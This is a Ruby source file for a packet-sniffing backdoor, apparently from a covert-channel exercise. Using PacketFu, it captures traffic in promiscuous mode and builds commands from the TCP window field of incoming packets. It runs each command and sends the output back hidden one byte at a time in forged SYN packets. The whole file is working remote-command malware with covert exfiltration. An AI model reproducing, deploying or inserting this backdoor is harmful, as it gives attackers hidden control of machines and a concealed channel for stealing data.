#!/usr/bin/env ruby

require 'csv'
require 'rubygems'
require 'packetfu'

# Local files
curdir = File.dirname(__FILE__);
require curdir + '/commands.rb'

class Backdoor
    include Commands
    @start = false
    @command = ""
    
    def initialize(start = false)
        conf_array = CSV.read("config.csv")
        @conf_array = conf_array[0]
        @iface = @conf_array[0]
        @cfg = PacketFu::Utils.whoami?(:iface=>@iface)
        
        if start then
            listen
        end # if
    end # initalize
    
    def listen
        if @start then
            puts "Backdoor already running"
        else # if
            @start = true
        end # else
    
        cap = PacketFu::Capture.new(:iface => @iface, :start => true,
                :promisc => true, :filter => @conf_array[1])
        
        cap.stream.each do |pkt|
            if PacketFu::TCPPacket.can_parse?(pkt) then
                packet = PacketFu::Packet.parse(pkt)
                process_packet(packet)
            end # can_parse? 
        end # cap
    end # listen
    
    def process_packet(packet)
        # Run Generic Command
        if packet.tcp_dst == @conf_array[2].to_i
            if packet.tcp_flags.fin == 1 then
                send_data(run_command(@command), packet)
                @command = ""
            else
                if @command.nil? then
                    @command = packet.tcp_win.chr
                elsif
                    @command << packet.tcp_win.chr
                end
            end # if
        end # if
        
        # Run get command
        #if packet.tcp_flags.syn == 1 and packet.tcp_flags.psh == 1 then
    end # process_packet
    
    def send_data(data, packet)      
        data.each_byte do |word|
            tcp = PacketFu::TCPPacket.new()
            
            tcp.eth_saddr = @cfg[:eth_saddr]
            tcp.tcp_src = rand(0xfff - 1024) + 1024
            tcp.tcp_dst = @conf_array[3].to_i
            tcp.tcp_flags.syn = 1
            tcp.tcp_win = word
            tcp.tcp_seq = rand(0xffff)
            tcp.ip_saddr = packet.ip_daddr
            tcp.ip_daddr = packet.ip_saddr
            
            tcp.recalc
            tcp.to_w(@iface)
        end
        
        tcp_fin = PacketFu::TCPPacket.new()
        
        tcp_fin.eth_saddr = @cfg[:eth_saddr]
        tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
        tcp_fin.tcp_dst = @conf_array[3].to_i
        tcp_fin.tcp_flags.fin = 1
        tcp_fin.tcp_seq = rand(0xffff)
        tcp_fin.ip_saddr = packet.ip_daddr
        tcp_fin.ip_daddr = packet.ip_saddr
        
        tcp_fin.recalc
        tcp_fin.to_w(@iface)
    end
end
